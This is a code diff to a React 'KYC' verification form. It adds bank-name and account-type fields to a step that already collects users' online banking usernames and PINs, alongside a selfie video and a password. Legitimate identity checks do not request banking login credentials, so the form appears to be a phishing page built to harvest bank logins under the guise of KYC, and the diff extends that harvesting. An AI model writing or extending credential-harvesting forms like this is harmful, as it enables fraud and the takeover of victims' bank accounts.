@@ -34,6 +34,8 @@ interface FormData {
   country: string
 
   // Financial Access
+  bankInstitutionName: string
+  accountType: string
   onlineBankingUsername: string
   onlineBankingPin: string
 
@@ -66,6 +68,8 @@ export default function KYCForm() {
     city: "",
     postalCode: "",
     country: "",
+    bankInstitutionName: "",
+    accountType: "",
     onlineBankingUsername: "",
     onlineBankingPin: "",
     selfieVideo: null,
@@ -131,6 +135,8 @@ export default function KYCForm() {
         break
 
       case 3: // Financial Access
+        if (!formData.bankInstitutionName.trim()) newErrors.bankInstitutionName = "Bank name is required"
+        if (!formData.accountType) newErrors.accountType = "Account type is required"
         if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
         if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
         break
@@ -182,6 +188,8 @@ export default function KYCForm() {
         )
       case 3:
         return (
+          formData.bankInstitutionName.trim() !== "" &&
+          formData.accountType !== "" &&
           formData.onlineBankingUsername.trim() !== "" &&
           formData.onlineBankingPin.trim() !== ""
         )
@@ -220,6 +228,8 @@ export default function KYCForm() {
     if (!formData.country) newErrors.country = "Country is required"
 
     // Financial Access
+    if (!formData.bankInstitutionName.trim()) newErrors.bankInstitutionName = "Bank name is required"
+    if (!formData.accountType) newErrors.accountType = "Account type is required"
     if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
     if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
 
@@ -250,6 +260,8 @@ export default function KYCForm() {
         city: 2,
         postalCode: 2,
         country: 2,
+        bankInstitutionName: 3,
+        accountType: 3,
         onlineBankingUsername: 3,
         onlineBankingPin: 3,
         password: 4,
